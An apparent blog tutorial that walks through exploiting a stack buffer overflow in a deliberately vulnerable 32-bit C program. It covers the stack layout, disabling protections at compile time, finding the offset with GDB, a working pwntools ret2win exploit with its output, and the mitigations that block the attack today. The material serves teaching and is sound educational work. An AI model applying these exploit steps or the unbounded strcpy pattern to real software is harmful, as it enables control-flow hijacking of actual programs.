---
layout: post
title: "Stack Buffer Overflow & Control Flow Hijacking"
date: 2026-07-10
category: learning
tags: [binary-exploitation, stack-overflow, ret2win, pwn]
severity: n-a
excerpt: "End-to-end exploitation of a classic stack buffer overflow on 32-bit x86 — from the stack layout and prologue/epilogue, to offset discovery in GDB and a working pwntools exploit."
---

# Stack Buffer Overflow & Control Flow Hijacking

In this walkthrough we'll exploit a classic **stack buffer overflow** to seize control of the program's instruction pointer and redirect execution to a function that should never have been reachable. We'll cover the memory layout, the function prologue/epilogue, the vulnerable code, and a fully automated exploit.

## Architecture Review

The x86 stack grows from **high memory addresses toward low addresses**. Every time a function is called, the CPU allocates a dedicated **stack frame** to hold its bookkeeping data: the return address, the previous frame pointer, and local variables.

### Stack Layout (32-bit x86)

```text
+------------------------------------+  <-- High Address
|  Arguments passed to function      |
+------------------------------------+
|  Saved EIP (Return Address)        |  <-- Target for hijacking
+------------------------------------+
|  Saved EBP (Old Base Pointer)      |
+------------------------------------+  <-- Current EBP points here
|                                    |
|  Local Variables (Buffers)         |  <-- Writes flow upward (toward high addresses)
|                                    |
+------------------------------------+  <-- Current ESP points here (Low Address)
```

This is the whole game: local variables live *below* the saved frame pointer and return address. If a buffer can be overrun **past its bounds**, the overflow travels upward into `Saved EBP` and then `Saved EIP`. Overwrite the return address and `ret` will jump wherever we say.

### Function Prologue & Epilogue

The compiler emits a fixed dance to set up and tear down each frame.

**Prologue** — enter the function, save the caller's frame, allocate locals:

```assembly
push ebp      ; Save previous base pointer
mov ebp, esp  ; Set current stack pointer as the new base
sub esp, 0x20 ; Allocate space for local variables
```

**Epilogue** — unwind the frame and return to the caller:

```assembly
mov esp, ebp  ; Restore stack pointer (destroy local variables)
pop ebp       ; Restore old base pointer
ret           ; Pop Saved EIP from stack and jump to it
```

The **`ret` instruction is the primitive we abuse**: it pops the value at the top of the stack into `EIP`. If that value is attacker-controlled, control flow is attacker-controlled.

## Vulnerable Code (`vuln.c`)

The bug is `strcpy(3)` — an unbounded copy into a fixed 64-byte buffer with no length check.

```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("Control hijacked! Successfully executed win()!\n");
}

void vulnerable_function(char *str) {
    char buffer[64];
    strcpy(buffer, str);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

### Compilation (Mitigations Disabled)

To analyze the raw vulnerability in isolation, we disable the two mitigations that would otherwise block this attack:

```bash
gcc -m32 -fno-stack-protector -no-pie vuln.c -o vuln
```

- `-fno-stack-protector` — removes the stack canary that would detect the overflow.
- `-no-pie` — fixes the binary's load address, so function addresses are constant across runs (critical for `ret2win` style exploits).

> On a modern distro you'll also need the 32-bit libc (`libc6-dev-i386`) and the `-m32` toolchain support to reproduce this locally.

## Exploit Development Walkthrough

### Step 1 — Locate the target function's address

Static address of `win()` via GDB:

```text
$ gdb ./vuln
gef➤  print win
$1 = {void (void)} 0x80484cb <win>
```

We now know our destination: `0x080484cb`.

### Step 2 — Determine the exact crash offset

Compiler alignment and padding mean the distance to the saved return address is *usually not* exactly the buffer size. We use a **cyclic pattern** to measure the true offset:

```text
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

The program crashes trying to "return to" our pattern bytes, which the CPU can't execute as a valid instruction:

```text
Invalid DWORD instruction pointer: 0x61616174 ("taaa")

gef➤  pattern offset taaa
[+] Found at offset 76
```

So the payload layout that hijacks control flow is:

```
[76 Bytes of Junk] + [4 Bytes of Target Address]
```

### Step 3 — Automate the exploit

```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='i386', os='linux')

binary_path = './vuln'
offset = 76
target_address = 0x080484cb  # address of win(), found in GDB

payload = b"A" * offset + p32(target_address)

p = process([binary_path, payload])

output = p.recvall().decode('utf-8', errors='ignore')
print(output)
```

### Step 4 — Run it

```text
(.venv) homigrotas@homi:~$ python3 exploit.py
[*] Sending payload of length 80...
[+] Starting local process './vuln': pid 15771
[+] Receiving all data: Done (72B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 15771)
Control hijacked! Successfully executed win()!
```

`win()` executed — a function the original program flow could never reach. (The SIGSEGV afterwards is expected: the binary "returns" to `0x41414141` once `win()` finishes, since our payload didn't set up a clean chain.)

## Why this works — and how it's stopped today

This entire attack is defeated in production by three mitigations:

| Mitigation | Effect | How it blocks us |
|------------|--------|------------------|
| **Stack canaries** | A random guard value sits between locals and `Saved EIP`. | Overflow corrupts the canary → program aborts before `ret`. |
| **NX (non-executable stack)** | Stack pages are not executable. | We couldn't run shellcode placed on the stack. |
| **ASLR / PIE** | Code, stack and heap are randomized per-run. | Hard-coded addresses like `0x080484cb` stop working. |

Modern exploitation doesn't kill the bug — it chains around these defenses (ROP for NX, leaks for ASLR). But the *core primitive* is always the same one we just weaponized: an unbounded write hitting the saved return address.

## Key takeaways

1. **The stack grows down; buffers overflow up** into the return address.
2. **`ret` is the hijack point** — it transfers control to whatever sits on top of the stack.
3. **Offset discovery with cyclic patterns** is the standard, reliable way to build a payload.
4. **A single unsafe `strcpy` is still a full code-execution primitive** on an unprotected binary.

Congrats — that's your first buffer overflow :) Next steps: tackle canaries with leak-first techniques, then chain a ROP gadget for a clean `execve("/bin/sh")`.
